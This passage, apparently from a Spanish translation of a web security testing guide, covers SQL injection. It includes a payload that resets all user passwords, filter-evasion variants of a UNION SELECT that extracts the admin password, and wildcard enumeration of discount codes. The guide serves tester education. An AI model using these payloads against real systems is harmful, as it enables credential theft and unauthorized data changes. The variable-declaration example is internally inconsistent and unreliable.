Declare @sqlstring varchar(8000)
Set @sqlstring  = ‘
Select ‘ + @columnamelist + ‘ from ReportTable‘
exec(@sqlstring)
Go

Entrada del usuario:

1 from users; update users set password = 'password'; select *

Esto hará que el reporte se ejecute y que se actualicen las contraseñas de todos los usuarios.

Explotación automatizada

La mayoría de las situaciones y técnicas presentadas aquí pueden llevarse a cabo de forma automatizada usando algunas herramientas. En este artículo, el evaluador puede encontrar información sobre cómo realizar auditorías automatizadas usando SQLMap.

Técnicas de evasión de firmas de inyección SQL

Las técnicas se utilizan para eludir defensas como los web application firewalls (WAF) o los sistemas de prevención de intrusiones (IPS). Consúltese también https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF

Espacios en blanco

Eliminar espacios o añadir espacios que no afecten a la sentencia SQL. Por ejemplo

or 'a'='a'

or 'a'  =    'a'

Añadir caracteres especiales como una nueva línea o un tabulador que no cambien la ejecución de la sentencia SQL. Por ejemplo,

or
'a'=
        'a'

Bytes nulos

Usar un byte nulo (%00) antes de cualquier carácter que el filtro esté bloqueando.

Por ejemplo, si el atacante pudiera inyectar el siguiente SQL

' UNION SELECT password FROM Users WHERE username='admin'--

al añadir bytes nulos quedaría

%00' UNION SELECT password FROM Users WHERE username='admin'--

Comentarios SQL

Añadir comentarios SQL en línea también puede ayudar a que la sentencia SQL sea válida y a eludir el filtro de inyección SQL. Tómese esta inyección SQL como ejemplo.

' UNION SELECT password FROM Users WHERE name='admin'--

Al añadir comentarios SQL en línea quedaría:

'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--

'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--

Codificación de URL

Usar el codificador de URL en línea para codificar la sentencia SQL

' UNION SELECT password FROM Users WHERE name='admin'--

La codificación de URL de la sentencia de inyección SQL será

%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--

Codificación de caracteres

La función Char() puede usarse para reemplazar caracteres del inglés. Por ejemplo, char(114,111,111,116) significa root

' UNION SELECT password FROM Users WHERE name='root'--

Al aplicar Char(), la sentencia de inyección SQL será

' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--

Concatenación de cadenas

La concatenación divide las palabras clave de SQL y evade los filtros. La sintaxis de concatenación varía según el motor de base de datos. Tómese como ejemplo el motor MS SQL

select 1

La sentencia SQL simple puede cambiarse como se muestra a continuación usando concatenación

EXEC('SEL' + 'ECT 1')

Codificación hexadecimal

La técnica de codificación hexadecimal usa codificación hexadecimal para reemplazar los caracteres de la sentencia SQL original. Por ejemplo, root puede representarse como 726F6F74

Select user from users where name = 'root'

La sentencia SQL usando el valor HEX será:

Select user from users where name = 726F6F74

o

Select user from users where name = unhex('726F6F74')

Declaración de variables

Declarar la sentencia de inyección SQL en una variable y ejecutarla.

Por ejemplo, la siguiente sentencia de inyección SQL

Union Select password

Definir la sentencia SQL en la variable SQLivar

; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)

Expresión alternativa de 'or 1 = 1'

OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1

Inyección de comodines SQL

La mayoría de los dialectos SQL admiten tanto comodines de un solo carácter (normalmente "?" o "_") como comodines de varios caracteres (normalmente "%" o "*"), que pueden usarse en consultas con el operador LIKE. Incluso cuando se usan controles adecuados (como parámetros o sentencias preparadas) para protegerse contra ataques de inyección SQL, puede ser posible inyectar comodines en las consultas.

Por ejemplo, si una aplicación web permite a los usuarios introducir un código de descuento como parte del proceso de pago, y comprueba si este código existe en la base de datos mediante una consulta como SELECT * FROM discount_codes WHERE code LIKE ':code', entonces introducir un valor de % (que se insertaría en lugar del parámetro :code) coincidiría con todos los códigos de descuento.

Esta técnica también podría usarse para determinar códigos de descuento exactos mediante consultas cada vez más específicas (como a%, b%, ba%, etc.).
